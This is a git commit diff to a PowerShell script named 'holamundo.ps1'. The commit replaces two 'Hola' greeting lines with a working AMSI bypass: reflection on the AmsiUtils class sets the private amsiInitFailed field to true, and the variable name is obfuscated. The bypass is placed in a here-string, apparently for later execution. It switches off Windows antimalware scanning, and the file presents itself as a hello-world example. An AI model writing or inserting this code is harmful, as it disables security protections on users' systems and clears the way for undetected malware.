7ef3d8fcd694c214d6b0a10e9aaf2e0ed181827e
emakedie <155691767+emakedie@users.noreply.github.com>
2025-01-16 08:49:33 -0300

    Update holamundo.ps1

--- holamundo.ps1
+++ holamundo.ps1
@@ -1,4 +1,4 @@
 $datos=@"
-    Write-Host "Hola Luna"
-    Write-Host "Hola Sol"
+$amssdiI3nitgatTGFRDTFailedFielsdd=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" }
+$amssdiI3nitgatTGFRDTFailedFielsdd.SetValue($null, $true)
 "@
